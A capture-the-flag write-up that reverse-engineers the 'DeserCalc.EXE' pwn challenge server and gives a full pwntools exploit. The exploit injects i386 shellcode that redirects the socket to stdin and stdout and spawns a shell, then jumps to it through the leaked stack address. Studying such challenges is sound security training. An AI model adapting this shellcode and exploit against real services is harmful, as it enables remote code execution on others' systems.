---
ctf_name: "reply ctf 2020"
title: "DeserCalc.EXE"
date:	2020-10-10
author: "nick0ve" 
category: "pwn"
---

## Program description
Two files are given, [client](https://github.com/fibonhack/fibonhack.github.io/blob/master/_posts/2020/reply2020/DeserCalc.EXE/server?raw=true) and [server](https://github.com/fibonhack/fibonhack.github.io/blob/master/_posts/2020/reply2020/DeserCalc.EXE/client?raw=true) , but only the server is worth analyzing.

It is a forking server, the function which handles the connection is located @ 0x08049882. 

It exchanges messages with the client by using a struct like that
```c
struct RPC {
    uint32 addr;
    char msg[100];
}
```

The handler function:
- check if the first msg received is `JustPwnThis!`
- reply with the string OK
- send an RPC object containing the address of do_calculation
- receive an RPC object and assert that received_RPC.addr == do_calculation
- then send another RPC object where send_RPC.addr == do_calculation - stack_buffer
    - So it is easy to calculate stack_buffer = do_calculation - send_RPC.addr
- receive 2 RPC ojects and execute the function @ RPC[1].addr

handler pseudocode:
```c
int handler(int client_fd)

{
  char buf [100];
  char *local_18;
  RPC *rpc_obj;
  
  log('I',"PID %d: %s\n",_Var1,"Incoming connection...", getpid());
  if check_password(client_fd,"JustPwnThis!") == 0) {
    send_nullterminated(client_fd,"WRONG\n");
    return -1;
  }
  else {
    send_nullterminated(client_fd,"OK\n");
    send_RPC_docalc(client_fd);
    rpc_obj = alloc_RPC_structs(2);
    
    if (check_RPC_addr_and_leak_param3(client_fd,rpc_obj + 1,buf) == 0) {
      log('W',"PID %d: %s\n",_Var1,"exiting. reason: wrong RPC address...", getpid());
      return -1;
    }
    else {
      recv_2_RPC_structs(client_fd,rpc_obj);
      local_18 = (char *)(*(code *)rpc_obj[1].RPC_addr)(buf);
      send_RPC_docalc_msg(client_fd,local_18);
      log('I',"PID %d: %s\n",_Var1,"exiting normally...", getpid());
      return 0;
    }
  }
}
```

## Exploit
checksec server output:
```
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
```
NX is disabled so it is possible to just jump at the stack buffer leaked by the server

```python
from pwn import *
from binascii import hexlify

# Set up pwntools for the correct architecture
context.update(arch='i386')
exe = ELF('./server')

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.REMOTE:
        return remote('gamebox1.reply.it', 27364)
    else:
        return remote('127.0.0.1', 8000)

def RPC(addr, msg):
    while len(msg) != 100:
        msg += b'\x41'
    return p32(addr) + msg


shellcode = '''
    mov ebx, 0x08049300 # close

# close(0)
    push 0
    call ebx

# close(1)
    push 1
    call ebx

    mov ebx, 0x08049050 # dup2

# dup2(4,0)
    push 0
    push 4 
    call ebx

# dup2(4,1)
    push 1
    push 4 
    call ebx

# execve binbash
    xor    eax, eax
    push   eax
    push   0x68732f2f
    push   0x6e69622f
    mov    ebx, esp
    mov    ecx, eax
    mov    edx, eax
    mov    al, 0xb
    int    0x80
'''

io = start()

password = b'JustPwnThis!'
io.recvuntil(b'Password:')
io.sendline(password)
io.recvuntil(b'OK\n')

io.recv()

DO_CALCULATION = 0x0804a8c8

scode = asm(shellcode, arch = 'i386')

# this scode is gonna be stored in buf of handler function
payload = RPC(DO_CALCULATION, scode)
io.send(payload)
RPC1 = io.recv()
bufleak = (DO_CALCULATION - u32(RPC1[:4])) & 0xffffffff
print ("buf @ %08x" % (bufleak))

'''
Sending 
- garbage RPC
- RPC (function_to_execute=scode_location, garbage)
'''
io.send(RPC(0,b'')+RPC(bufleak,b''))

# get a shell
io.interactive()
```

The shellcode closes stdin,stdout, redirect stdin and stdout to the client_fd with dup2(client_fd,1) dup2(client_fd,0), then it does the classic execve(binbash)
